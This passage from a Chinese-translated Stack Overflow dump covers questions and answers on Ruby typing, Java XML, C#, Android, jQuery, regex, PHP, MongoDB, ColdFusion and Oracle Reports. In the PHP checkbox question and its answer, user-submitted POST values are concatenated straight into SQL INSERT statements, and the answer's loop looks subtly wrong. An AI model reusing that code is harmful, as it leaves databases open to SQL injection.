                @tp = type
        end
        def typecheck
                #call typechecker
                puts "checked"
        end
end 
```

测试代码：

```
a = 3
a.mytype("nat")
puts a.tp
a.typecheck 
```

还有两个问题。 *首先*，我认为不可能向 Fixnum 添加新的构造函数。*其次*，我想拦截变量访问，即“b = a”调用a的方法'typecheck'。但这需要类似于面向方面编程的东西，我不确定这是否可以通过 Ruby 的元编程工具来解决。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-27T18:20:23.987

> 我在 Ruby 中读过，一切都是对象

这取决于您对“*对象*”和每个“*事物*”的定义。“*对象*”可以表示“*可以被程序操作的实体*”（从现在开始我将称之为**对象**），或者“*作为对象系统成员的值*”（从现在开始我将称之为`Object`）。

在Ruby 中，程序可以操作的所有东西（即每个**对象**）也是一个`Object`，即一个类的实例。这与 Java 不同，例如，*原语*可以由程序操作（即在这个词的意义上是**对象**），但不是`Objects`. 在 Ruby 中，不存在这种区别：每个**对象**都是一个对象`Object`，每个对象`Object`也是一个**对象**。

但是，语言中有些*东西**不能*被程序操作，也不是类的实例，即它们既不是**object**也不`Object`是 s。例如，这些是方法、变量、语法、参数列表、参数列表、关键字。

注意：你可以使用 Ruby 的反射 API 给你一个*代表*方法或参数列表的对象，但那个对象只是一个代理，它不是真实的东西。

所以，当我们说“*一切都是对象*”时，我们真正的意思是“每个**对象**都是一个`Object`”，即程序可以操作的一切都是对象系统的成员，或者换句话说，有在对象系统之外没有值（与 Java 中的原语不同）。我们*并不是*说该语言中存在的所有内容也可以在运行时由程序进行操作。

> 所以变量是对象

不，不幸的是，它们既不是**object**也不`Object`是 s。

这在 Ruby 语言规范中也有明确说明（重点由我添加）：

> # 6.2 变量
> 
> ## 6.2.1 一般说明
> 
> 变量由名称表示，并**引用**一个对象，称为变量的值。 **变量本身不是对象**。

在[Matz 和 David Flanagan所著](http://Amazon.Com/dp/0596516177/)[*的 The Ruby Programming Language*](http://Amazon.Com/dp/0596516177/)一书中，它在第 2 页上说：

> 每个值都是一个对象

请注意，它并没有说明所有*内容*，只说明了每个*值*。

另请参阅问题[Is variable is object in ruby​​?](http://StackOverflow.Com/a/8385471/2988/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T18:38:04.783

您可以做几件事。对于初学者，所有（或几乎所有）Ruby 类（包括诸如数字之类的“原语”）都支持 to_s 方法，该方法返回对象的字符串表示形式。对于数字，to_s 将只返回该数字的字符串表示形式（例如，“42”代表 42）。为其他类返回的字符串值会有所不同。好处是您可以[通过 "monkey patching" 覆盖类的方法](https://stackoverflow.com/questions/394144/what-does-monkey-patching-exactly-mean-in-ruby)。这是一个非常人为的例子：

```
class Array
  def to_s
    return "An array of size #{self.size}."
  end
end

a = [1, 2, 3, 4]
puts a.to_s
# => "An array of size 4." 
```

对于有关每次设置变量值时执行方法的其他问题，处理此问题的方法是始终通过其访问器方法与变量进行交互。这样，您可以在属性的 getter 和 setter 方法中实现自定义代码（或简单地从访问器内部调用另一个方法）。像这样：

```
class MyClass
  # Use the default getter for var.
  attr_reader :var      

  def initialize
    @var = 1
  end

  # Custom setter for var.
  def var= v
    @var = v
    puts "var changed to #{v}"
  end
end

mc = MyClass.new
mc.var = 9
# => "var chaged to 9" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T18:53:53.750

你可以做这样的事情，但它只适用于全局：

```
$type_checked = {:$a => String, :$b => Array}
$type_checked.keys.each do |var|
  trace_var(var) do |obj|
    puts "hey, don't assign #{var} to a #{obj.class}" unless $type_checked[var] == obj.class
    #or raise an Error
  end
end

$a = 1
$a = "a"
$b = 1

#output:
#hey, don't assign $a to a Fixnum
#hey, don't assign $b to a Fixnum 
```

但这显然违背了语言的本质。

# java - 解析 xml 以找到根标记，然后将标记附加到根标记下

> ID：12146778
> 
> 赞同：0
> 
> 时间：2012-08-27T17:39:05.957
> 
> 标签：java, xml, xml-parsing

我的 web-directory 中有一个*xml*文件。目前它看起来像：

```
<?xml version="1.0" encoding="UTF-8"?>

<Blobs>

</Blobs> 
```

我想在标签*Blob下动态添加标签**blobkey*。如果已添加标签，则下次应附加新标签。我该怎么做呢 ？首先，我需要解析 xml 文件，找到根元素，然后在标记*Blobs下附加一个名为**blobkey*的新标记，该标记是根标记。

 ***这是我为此编写的一些代码，但它不符合我的要求。请提出一些建议。

```
 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();            
        Document document = db.newDocument();

        Element blobKey_E = document.createElement("BlobKey");
        blobKey_E.appendChild( document.createTextNode( blobKey ) );
        // Save the xml file after this 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:42:34.537

`document.getDocumentElement().appendChild(blobKey_E)`***

# c# - 如何从 ASP.NET WebApi 中的对象中排除某些属性

> ID：12146780
> 
> 赞同：3
> 
> 时间：2012-08-27T17:39:12.607
> 
> 标签：c#, .net, asp.net-mvc, asp.net-web-api

如果我有一个从 WebApi 返回的对象，是否可以将其中一个属性标记为 hidden ？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-28T03:45:49.670

您可以使用：

```
[JsonIgnore]
[XmlIgnore] 
```

这些将从这两种序列化中隐藏您的财产。我一直试图将两者混合在一个类中，但`JSonIgnoreAtrribute`它是一个密封类，并没有给我们留下无缝集成选项。

因此，直接的方法是在您的可忽略属性上添加这两个属性。

# android - android缩放手势如何工作？

> ID：12146781
> 
> 赞同：1
> 
> 时间：2012-08-27T17:39:14.013
> 
> 标签：android, android-gesture

在ScaleGesture中，android如何计算比例因子`detector.getScaleFactor();`在哪个范围内？

```
private class ScaleListener extends ScaleGestureDetector.SimpleOnScaleGestureListener {
            @Override
            public boolean onScale(ScaleGestureDetector detector) {
                mScaleFactor *= detector.getScaleFactor();

                // Don't let the object get too small or too large.
                mScaleFactor = Math.max(0.1f, Math.min(mScaleFactor, 15.0f));
                _renderer.z=-mScaleFactor;
                invalidate();
                return true;
            }
       } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T19:10:00.760

如果你搜索 pinch 你会发现基本上和源代码相同的公式：

```
mScaleFactor = getCurrentSpan() / getPreviousSpan(); 
```

它是当前夹点的距离除以第一个/旧夹点。

# android - CountDownTimer 更新和阻塞

> ID：12146783
> 
> 赞同：5
> 
> 时间：2012-08-27T17:39:40.600
> 
> 标签：android, multithreading, blocking, countdowntimer

如果正确理解 CountDownTimer，它不会在与启动它的活动不同的线程上运行。那么这是否意味着如果我在我的主要活动中启动一个 CountDownTimer，并且稍后在活动中阻塞另一段代码，这是否意味着 CountDownTimer 将不再随着线程被占用而更新？

如果是这样，如果我启动第二个活动，附加到主要活动的 CountDownTimer 是否也会停止更新？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:53:56.967

如果CountdownTimer是在主线程中启动的，那么主线程中的任何阻塞调用都会延迟`Ontick`and `Onfinish`()。

但第二部分不正确，因为即使启动了下一个活动，主线程仍在运行。因此，`CountdownTimer`即使您启动第二个活动，它也会继续运行

# javascript - jquery事件多次添加

> ID：12146789
> 
> 赞同：1
> 
> 时间：2012-08-27T17:39:52.263
> 
> 标签：javascript, jquery, ajax

我有一个相当大的 javascript 类，可以生成一个完整的 ajax 生成的应用程序。在 ajax 页面的一个版本中，有许多下拉菜单。这些菜单可以在应用程序生命周期的不同时间点创建和销毁。

这是我看到的行为：

用户打开页面版本 1：没有下拉列表用户转到页面版本 2：使用 jQuery onchange 事件添加的下拉列表。按预期工作。用户返回到页面的版本 1，下拉列表被删除。用户返回到第 2 版页面，再次添加下拉列表（使用相同的元素 ID）下拉列表现在将具有“双重”事件处理，触发每个 onchange 的事件。

我正在努力的行为如下。

在初始页面加载时，我添加了一个 onchange 事件：

```
 function myClass(){
       //Initiate once for current and future elements.
   jQuery(document).on('change',".mydropdowns",
   function(e){
        self.submitDescriptionChange(this);
    }
   );
   }

   myClass.prototype.submitDescriptionChange = function (el){
        doSomeAjaxStuff();
   } 
```

这很好用，除了每次用户转到页面版本 1 并返回页面版本 2 时，事件都会成倍增加。很快您就可以在每个更改事件中触发 20 次事件，在这种情况下会创建 20 个 ajax 调用。

从逻辑上讲，通过使用 jQuery.off() 我应该能够避免这种情况。但是发生的事情是事件从过去和未来的元素中删除，这意味着当我重新创建页面版本 2 时，下拉菜单将不起作用。

我尝试过的每一种方式（并且我尝试过 LOADS），我要么最终没有触发事件，要么触发了多个事件。我似乎找不到一种方法来添加/替换事件只触发一次的元素。

有什么想法可以解决这个问题吗？

**更新**

是的，所以事实证明我误诊了这个问题。它实际上来自反复重新绑定“hashchange”事件，而不是重新绑定 onchange 事件。为误导而道歉。将 bind() 函数移至仅在解决问题后才执行的某个位置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T17:57:48.093

由于您不希望 .off() 从其他页面中删除您的事件，我建议为您的事件使用命名空间。例如，像这样：

```
function myClass(pageno) {
    var pref_ev = 'mypage' + pageno + '.' + 'change';
    $(document).off(pref_ev).on(pref_ev, ".mydropdowns", function(e) {
        self.submitDescriptionChange(this);
    });
} 
```

这样，每个页面都会有自己的“更改”事件，例如“mypage1.change”。该事件仍然正常注册为更改事件；前缀命名空间“mypage1”仅用于对正确的事件执行 .off() 调用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:49:42.567

我不确定您的下拉菜单使用的是什么插件，但该插件上应该有一个“销毁”方法。如果您在删除应该起作用的下拉菜单时调用它。此外，如果您只是隐藏第二页而不是实际将其从 DOM 中删除，则您不必重新调用插件，因为插件仍将保存在元素上。

# jquery - 点击一个按钮，弹出一个表格

> ID：12146794
> 
> 赞同：0
> 
> 时间：2012-08-27T17:39:56.427
> 
> 标签：jquery, asp.net

我在 asp.net 网页中有一个按钮，我想通过单击该按钮来显示一个表格。这是图像。

![图像1](../Images/f2e1c93683ba5ece42c53f50c2a20439.png)

然后点击“搜索设备”。

![图2](../Images/689642e3cccb113d6af7ce58c53a437e.png)

我从某个地方借来了代码。最初它是 jquery 代码，按钮是一个 div 部分。我的问题：

1.  如果纯asp.net代码，如何生成这个动态表？我知道 DataGrid 是一种选择，还有其他方法吗？在单击按钮之前，我不想显示它。
2.  asp.net 和 jquery 的结合。该按钮是一个 asp.net 按钮，但该表是从客户端技能中获得的。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-27T17:55:11.017

您可以在纯 asp.net 代码中执行此操作，但在按下按钮时需要回发。

您也可以使用`asp:gridview`控件。它看起来很像一张桌子。你的按钮后面的代码看起来像这样

```
Protected Sub okButton_Click(sender As Object, e As EventArgs) Handles okButton.Click
    ... //set your gridview up
    gridview1.datasource = whateveryourdatasourceis //can be list, array, datatable
    gridview1.databind()
    gridview1.visible = true
End Sub 
```

上面的代码是 vb.net

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:53:58.357

您应该使用服务器端代码来处理这一切。它更容易处理，并且没有真正的理由使用客户端 javascript 创建表。

1.  使用 GridView 并将您的数据源绑定到它。
2.  在搜索字段和结果周围使用 UpdatePanel 以避免刷新页面。

# javascript - 正则表达式用回车替换句子的每个结尾

> ID：12146812
> 
> 赞同：1
> 
> 时间：2012-08-27T17:40:55.020
> 
> 标签：javascript, regex

我需要正则表达式将每个替换`'. '`为`'.' + Chr(13)`. 这是我尝试过的：

```
x = x.replace(/. /g,/.\n/); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:44:28.653

您需要转义`.`并替换为字符串，而不是正则表达式：

```
x = x.replace(/\. /g, '.\n'); 
```

另外，如果你真的是`Chr(13)`说，那`\r`不是`\n`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:42:47.333

是正则表达式中的`.`通配符。你需要逃避它。此外，替换为字符串文字。另外，我什至没有注意到这一点，但 Felix Kling 指出，`\n`这不是回车。

```
x = x.replace(/\. /g, "\r"); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-27T17:43:08.747

只需将您的表达替换为`/\. /`

# iphone - 用于网络应用程序的带十进制的 iPhone 数字键盘？

> ID：12146813
> 
> 赞同：19
> 
> 时间：2012-08-27T17:40:55.727
> 
> 标签：iphone, html, ios, forms

我知道对于原生 iPhone 应用程序，您可以使用 UIKeyboardTypeDecimalPad 强制使用带小数的数字键盘。有什么方法可以为移动网页或 Web 应用程序上的输入字段强制使用相同的键盘？如果还没有，有谁知道这个检测是否会在 iOS 6 中添加到 Safari 中？

我能够毫无问题地显示常规数字键盘，但我真的很想拥有十进制键，所以我不需要显示完整的键盘。

谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-07T02:37:35.967

这是不可能的，但是有一个小技巧，您可以使用它。

看看这个链接 - [http://web.archive.org/web/20151110014447/http://www.brownphp.com/2011/05/iphone-currency-input-web-apps/](http://web.archive.org/web/20151110014447/http://www.brownphp.com/2011/05/iphone-currency-input-web-apps/)

一旦用户开始在字段中写入/键入，它就会开始以这种方式添加数字 - 0.01 -> 0.12 -> 1.23 -> 12.34 。所以这可以用于类似的效果。

这里还概述了 Web 应用程序的输入类型，您可以在其中看到不能使用带有数字和小数点的输入类型。

[http://www.fabianpimminger.com/web-development/how-to-change-the-iphone-on-screen-keyboard-in-web-apps/](http://www.fabianpimminger.com/web-development/how-to-change-the-iphone-on-screen-keyboard-in-web-apps/)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2019-05-24T13:54:44.560

结帐`inputmode="decimal"`属性。

[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/inputmode](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/inputmode)

尚未得到广泛支持，但它在 iOS 12.2 中可用。

[https://caniuse.com/#feat=input-inputmode](https://caniuse.com/#feat=input-inputmode)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-05-30T13:27:10.950

将 inputmode="decimal" 属性添加到输入标签。

```
<input id="price" type="number" min="0" inputmode="decimal"> 
```

[在https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/inputmode](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/inputmode)检查其他输入模式

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T20:34:13.607

问题`number`是它只接受整数。我在他提到添加的地方找到[了这个](http://blog.isotoma.com/2012/03/html5-input-typenumber-and-decimalsfloats-in-chrome/)`step="any"`。现在您获得了数字小键盘并可以输入小数。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-27T17:51:55.553

[Apple 文档](http://developer.apple.com/library/safari/#documentation/appleapplications/reference/SafariHTMLRef/Articles/InputTypes.html)将`number`其列为输入类型：

> 用于指定数字的文本字段。在 iOS 3.1 及更高版本中调出数字键盘。指定 \d* 或 [0-9]* 的输入类型等效于使用此类型。

# android - 分离不触发 onSaveInstanceState() 的片段

> ID：12146818
> 
> 赞同：6
> 
> 时间：2012-08-27T17:41:31.963
> 
> 标签：android, save, fragment, detach

我的 Android 应用程序有一个`ActionBar`变化，它`Fragment`占据了一定的`FrameLayout`. 我正在尝试`onSaveInstanceState`在选项卡更改时保存 Fragment 的状态，以便可以在`onCreateView`.

问题是，`onSaveInstanceState`永远不会被调用。' `Fragment`s`onDestroyView`和`onCreateView`方法被调用，但`Bundle`提供的 to`onCreateView`保持为空。

有人可以向我解释何时`onSaveInstanceState`实际调用它，我如何确保在切换选项卡时调用它，或者在`Fragment`分离和重新连接时保存和恢复状态的最佳实践？

分段：

```
@Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, 
        Bundle savedInstanceState) {
    View view = inflater.inflate(R.layout.event_log, container, false);

    // Retrieve saved state
    if (savedInstanceState != null){
        System.out.println("log retrieved");
    } else {
        System.out.println("log null");
    }

    return view;
}

@Override
public void onSaveInstanceState(Bundle outState) {
    System.out.println("log saved");
    super.onSaveInstanceState(outState);
    // more code
} 
```

活动：

```
/**
 * Detach the current Fragment, because another one is being attached.
 */
@Override
public void onTabUnselected(Tab tab, FragmentTransaction ft) {
    if (tab.getText().equals(getString(R.string.tab_events))){
        if (frEventLog != null) {
            ft.detach(frEventLog);
    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-27T18:05:26.310

`Fragment#onSaveInstanceState`仅在`Activity`托管`Fragment`被销毁并且您有机会返回相同的活动并且片段仍添加到`FragmentManager`. 最常见的情况是屏幕旋转。

例如，我认为您`Fragment`还需要这样做[`setRetainInstance(true)`](http://developer.android.com/reference/android/app/Fragment.html#setRetainInstance%28boolean%29)。`onCreate`虽然不完全确定这一点。

例如，当您按下主页按钮时，您还应该看到此方法被调用。这将破坏活动，但您可以使用例如任务列表返回到它。

如果你只是`detach()`片段，你需要做的就是把它找回来`FragmentManager`。

有两个例子你应该看看：

[`ActionBar`FragmentTabs](https://github.com/android/platform_development/blob/master/samples/ApiDemos/src/com/example/android/apis/app/FragmentTabs.java)和[`TabHost`FragmentTabs](https://github.com/android/platform_development/blob/master/samples/Support4Demos/src/com/example/android/supportv4/app/FragmentTabs.java)

该`TabHost`示例使用

```
ft.add(containerId, fragment, tag);
// later
fragment = mActivity.getSupportFragmentManager().findFragmentByTag(tag); 
```

要查找先前添加的 s的实例`Fragment`，直到您`remove()``Fragment`

* * *

关于`onCreateView`/ `onDestroyView`：一旦片段分离就会调用它，因为下次附加它需要创建一个新的`View`. 请注意，`Fragment#onDetached()`当您使用片段时不会调用`detach()`它，因为它仍然附加到`Activity`. 它仅与视图层次结构分离。

* * *

[还有另一个很好的例子，关于如何在 Android Training - Caching Bitmaps](http://developer.android.com/training/displaying-bitmaps/cache-bitmap.html#config-changes)中保留片段状态/如何使用片段保留状态。

但是，该示例缺少关键行：

```
public static RetainFragment findOrCreateRetainFragment(FragmentManager fm) {
    RetainFragment fragment = (RetainFragment) fm.findFragmentByTag(TAG);
    if (fragment == null) {
        fragment = new RetainFragment();
        fm.beginTransaction().add(fragment, TAG).commit(); // << add this
    }
    return fragment;
} 
```

# php - 根据选中的复选框将所有值插入一行

> ID：12146820
> 
> 赞同：1
> 
> 时间：2012-08-27T17:41:34.777
> 
> 标签：php, mysql, checkbox

我有下表从数据库中获取数据：

```
while($row = mysql_fetch_array($result)) 
{
echo '
    <tr>
        <td width="320">
            <input type="checkbox" name="product_ID[]" value="'.$row['Product_ID'].'" />'.$row['Product_description'].'<br />
        </td>
        <td width="50">
            <input type="text" name="product_cost[]" value="'.$row['Product_Retail_cost'].'" maxlength="3" size="3" />
        </td>
        <td width="50">
            <input type="text" name="product_quantity[]" value="1" maxlength="3" size="1" />
        </td>
    </tr>';
} 
```

我想做的是将行插入表中，确保从两个文本框中插入任何更新的值。插入看起来像这样：

```
$product_ID = $_POST['product_ID'];
$product_cost = $_POST['product_cost'];
$product_quantity = $_POST['product_quantity'];

for ($i=0; $i<sizeof($product_ID);$i++)
    {
    $query="INSERT INTO mjj_ordered_products 
                (`Order_ID`, 
                `Product_ID`, 
                `Product_Quantity`, 
                `Product_Price`)
    VALUES ((SELECT MAX(Order_ID) AS Order_ID FROM `mjj_orders`),
                '".$product_ID[$i]."',
                '".$product_quantity[$i]."',
                '".$product_cost[$i]."')";
    mysql_query($query) or die (mysql_error());
    } 
```

但是，虽然这插入了正确的 Product_ID，但插入的其余两个值并不对应于选定的复选框，而是通过循环整个列表。

问题：如何将与复选框关联的其他 2 个值插入数据库？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T18:01:36.033

假设 Product_ID 是唯一的，您可以将其作为所有数组中的索引传递，例如

```
<input type="text" name="product_cost['.$row['Product_ID'].']" value="'.$row['Product_Retail_cost'].'" maxlength="3" size="3" /> 
```

然后做类似的事情

```
foreach($product_ID as $id)
{
  $query="INSERT INTO mjj_ordered_products 
                (`Order_ID`, 
                `Product_ID`, 
                `Product_Quantity`, 
                `Product_Price`)
    VALUES ((SELECT MAX(Order_ID) AS Order_ID FROM `mjj_orders`),
                '".$product_ID[$id]."',
                '".$product_quantity[$id]."',
                '".$product_cost[$id]."')";
    mysql_query($query) or die (mysql_error());
} 
```

# javascript - 在jQuery中右键粘贴后调用函数

> ID：12146830
> 
> 赞同：15
> 
> 时间：2012-08-27T17:42:10.140
> 
> 标签：javascript, jquery

我知道我们可以使用如下绑定粘贴事件：

```
$('#id').bind('paste', function(e) { 
    alert('pasting!') 
}); 
```

但问题是，它会在粘贴的文本粘贴之前调用。我希望*在右键单击后*触发一个函数- >粘贴粘贴在输入字段上的文本，以便我可以访问事件处理函数中的粘贴值。

`.change()`事件也无济于事。目前我使用`.keyup()`事件，因为我需要在输入该输入字段时显示剩余字符数。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-08-27T17:44:43.583

有点黑客，但是：

```
$("#id").bind('paste', function(e) {
        var ctl = $(this);
        setTimeout(function() {
            //Do whatever you want to $(ctl) here....
        }, 100);
}); 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2015-01-21T10:58:10.747

为什么不使用“输入”事件？

```
$("#id").bind('input', function(e) {
    var $this = $(this);
    console.log($this.val());
}); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-27T18:07:48.337

这将阻止用户使用键盘进行任何粘贴、处理或剪切：

```
$("#myField").keydown(function(event) {
   var forbiddenKeys = new Array('c', 'x', 'v');
   var keyCode = (event.keyCode) ? event.keyCode : event.which;
   var isCtrl;
   isCtrl = event.ctrlKey

     if (isCtrl) {
       for (i = 0; i < forbiddenKeys.length; i++) {
           if (forbiddenKeys[i] == String.fromCharCode(keyCode).toLowerCase()) {
             return false;
        }
     }
}
return true;
}); 
```

这将对鼠标事件执行相同的操作：

```
$("#myField").bind("cut copy paste",function(event) {
   event.preventDefault();
}); 
```

即使上述内容不会阻止右键单击，用户也无法从该字段粘贴、剪切或复制。

要在事件之后使用它，就像您想知道的那样，您必须使用[JavaScript Timing Event](http://www.w3schools.com/js/js_timing.asp)

```
setTimeout(function() {
  // your code goes here
}, 10); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-27T18:02:40.240

我遇到了同样的问题，我选择通过 javascript 复制粘贴操作并改用该输出：

```
var getPostPasteText = function (element, pastedData) {
    // get the highlighted text (if any) from the element
    var selection = getSelection(element);
    var selectionStart = selection.start;
    var selectionEnd = selection.end;

    // figure out what text is to the left and right of the highlighted text (if any)
    var oldText = $(element).val();
    var leftPiece = oldText.substr(0, selectionStart);
    var rightPiece = oldText.substr(selectionEnd, oldText.length);

    // compute what the new value of the element will be after the paste
    // note behavior of paste is to REPLACE any highlighted text
    return leftPiece + pastedData + rightPiece;
}; 
```

请参阅[IE 的 document.selection.createRange 不包括](https://stackoverflow.com/questions/3622818/ies-document-selection-createrange-doesnt-include-leading-or-trailing-blank-li)`getSelection`函数源的前导或尾随空行。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-06-30T17:30:42.183

无需绑定：

```
$(document).on('keyup input', '#myID', function () {
  //Do something      
}); 
```

# c# - 像 mongdbo objectid 这样的字节打包

> ID：12146833
> 
> 赞同：2
> 
> 时间：2012-08-27T17:42:31.103
> 
> 标签：c#, mongodb, bytearray

Mongodb 对象 id 是一个字节数组，其中大量信息被打包到字节数组中，如下所示：

[http://www.mongodb.org/display/DOCS/Object+IDs#ObjectIDs-TheBSONObjectIdDatatype](http://www.mongodb.org/display/DOCS/Object+IDs#ObjectIDs-TheBSONObjectIdDatatype)

即：给定一个 id `47cc67093475061e3d95369d`，它包含日期时间、机器、id 和 inc 信息。他们如何将所有这些信息存储到 id 中？

他们是怎么做到的？字节打包是如何发生的？

有没有代表这个的例子？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T21:30:01.163

时间是自 1970 年 1 月 1 日以来的秒数，在他们的示例中是 1,204,578,057。

对于二进制表示，1204578057（基数 10）是 47cc6709（基数 16）。没什么可做的。这就是它在计算机上的样子。

要将该值转换为字符串（对于 ObjectId 方法），只需使用“X”调用[ToString ：](http://msdn.microsoft.com/en-us/library/6t7dwaa5.aspx)

```
1204578057.ToString("X") 
```

结构本身在此处完全定义 - [BSONObjectIDSpecification](http://www.mongodb.org/display/DOCS/Object+IDs#ObjectIDs-BSONObjectIDSpecification)。

您可能还想在这里研究结构布局：http: [//msdn.microsoft.com/en-us/library/system.runtime.interopservices.structlayoutattribute.aspx](http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.structlayoutattribute.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T18:34:09.187

抱歉，如果我不理解您的问题，但 ObjectId 的格式在您提供的链接中给出。在您提供的 ID 中，这意味着以下内容：

`47cc67093475061e3d95369d`

字节 0、1、2 和 3 = 时间戳。
`47cc6709`= 时间戳。

字节 4、5 和 6 = 机器 ID。
`347506`= 机器 ID。

字节 7 和 8 = PID
`1e3d`= PID

字节 9、10 和 11 = 增量
`95369d`= 增量

# jquery - Jquery Ajax 调用 CFC 不起作用

> ID：12146841
> 
> 赞同：3
> 
> 时间：2012-08-27T17:42:51.017
> 
> 标签：jquery, ajax, coldfusion, cfc

我在使用以下代码时遇到问题。我正在寻找验证地址（城市、邮编、州）并将其与我们数据库中的内容（在 CFC 中调用）进行检查。当我为 Ajax 设置 dataFilter 时，它会进入错误并显示“parseerror”，并且我没有看到字符串 javascript 返回。当我删除 dataFilter 时，在控制台中我看到 javascript 字符串返回，但它总是进入成功设置的“else”。
有谁知道发生了什么？我究竟做错了什么？CFC 确实根据 Fiddler 正确返回（真/假）。

```
$.ajax({
    type: "get",
    url: "/component/validateLenderAddress.cfc",
    data: {
        method: "validateZipCityState",
        returnFormat: "json",
        zip:$('input[name*="zip"]').val(), 
        city:$('input[name*="city"]').val(), 
        state:$('input[name*="state"]').val()
    },
    async: false,
    cache: false,
    dataFilter: function(data) {
        return $.parseJSON(data);
    },
    success:function(data) {
        if (data) {
            alert('Address Validated');
            return true;
        }
        else {
            alert('Address could not be validated');
            return false;
        }
    },
    error: function(xhr, ajaxOptions, thrownError) {
        alert(ajaxOptions);
    }
}); 
```

我的 CFC 是

```
<cfcomponent output="false" extends="component.Database" hint="validates lender address lendermaint.inc">    
<cffunction name="validateZipCityState" output="false" returnType="struct" access="remote"> 
     <cfargument name="zip" type="string" required="true"> 
     <cfargument name="city" type="string" required="true"> 
     <cfargument name="state" type="string" required="true"> 

     <cfset var local = structNew()>

     <cfquery name="local.zipCodeList" datasource="#getDSN()#" username="#getUsername()#" password="#getPassword()#"> 
          SELECT TOP 1 1 
          FROM ZipCode 
          WHERE zipCode = <cfqueryparam cfsqltype="cf_sql_varchar" value="#trim(arguments.zip)#"> 
               AND city = <cfqueryparam cfsqltype="cf_sql_varchar" value="#trim(arguments.city)#"> 
               AND stateShort = <cfqueryparam cfsqltype="cf_sql_varchar" value="#trim(arguments.state)#"> 
     </cfquery> 

     <cfreturn local.zipCodeList.recordCount EQ 1> 
</cffunction> 
```

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T17:57:27.080

而不是使用刚刚设置的dataFilter `{ dataType : "json" }`，您不需要使用dataFilter。此外，如果您在对`Content-type: application/json`jquery 的响应上设置标头，则会自动将响应处理为 json。

此外，请考虑删除异步，因为您已经有处理程序来等待响应，这可能会锁定浏览器并移动您的错误并完成处理程序以使用 jqXHR .done() 和 .fail()

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-28T01:42:00.327

我将以下内容放入所有远程组件中：

```
<cfparam name="url.returnformat" default="json">
<cfparam name="url.queryformat" default="column"> 
```

这是我写的一个插件来帮助我做ajax：

```
!function($, window, undefined) {
    $.ajaxSetup ({
         cache: false // http://stackoverflow.com/questions/168963/stop-jquery-load-response-from-being-cached
    });
    $('#msg').ajaxStart(function() {
      $(this).empty().removeClass('alert alert-info');
    });
    $.fn.myAjax = function(myURL, mySettings) {
        var local = {};
        local.settings = {
            type: 'post',
            dataType: 'json',
            context:this[0]
        };
        local.settings = $.extend({}, local.settings, mySettings);
        local.XHR = $.ajax(myURL,local.settings);
        local.XHR.done(function(result) {
            if (result.MSG) {
                $('#msg').html(result.MSG).addClass('alert alert-error');
            }
        });
        local.XHR.fail(function(A,B,C) {
            $('#msg').html(C).addClass('alert alert-error');
        });
        return local.XHR;
    };
}(jQuery, window); 
```

它允许您做的是在返回时使用“this”：

```
!function($, window, undefined) {
    var settings = {}
    settings.data = {};
    settings.data.method = 'Save';

    $('input:checkbox').on('change',function() {
        $(this).removeAttr('checked');
        settings.data.xxxID = $(this).val();
        var myPromise = $(this).myAjax('xxx.cfc',settings);
        myPromise.done(function(result) {
            if (!result.MSG) {
                $(this).prop('checked',true); // OK, it's been inserted.
                local.qryxxx = result.qry.DATA;
                local.qryxxx.RecordCount = result.QRY.ROWCOUNT;
                local.qryxxx.ColumnList = result.QRY.COLUMNS;
            }
        });
    });
}(jQuery, window); 
```

# oracle - 在报告的第二页上使用非重复框架

> ID：12146851
> 
> 赞同：1
> 
> 时间：2012-08-27T17:43:41.563
> 
> 标签：oracle, frames, oraclereports

我有一份无法正常运行的 Oracle 10g 报告。我在最低的重复帧中有三个重复帧和一个非重复帧，其中包含我的数据元素。我的问题是，当我在布局的第一页上有这个不重复的框架时，它工作得很好，但是，当我将该框架连同所有数据元素一起向下滑动到布局中的第二页时，它就不起作用了。重申这就是我所做的一切，没有更改属性或添加或删除数据元素，只是所有当前元素滑到布局的第二页。

这向你展示了我在说什么

![错误](../Images/9c78cd54c3f9f513ce29e1388cc56729.png)

这是错误消息

> 因错误终止：`<br>`REP-1814：报告无法格式化。对象“垂直”永远不能放在“M_DEFAULT_MR_LETTER”中。

这向您展示了我如何设置报告和静态名声属性

![形式](../Images/09967931cce413fdcab964fb11ceed8d.png)

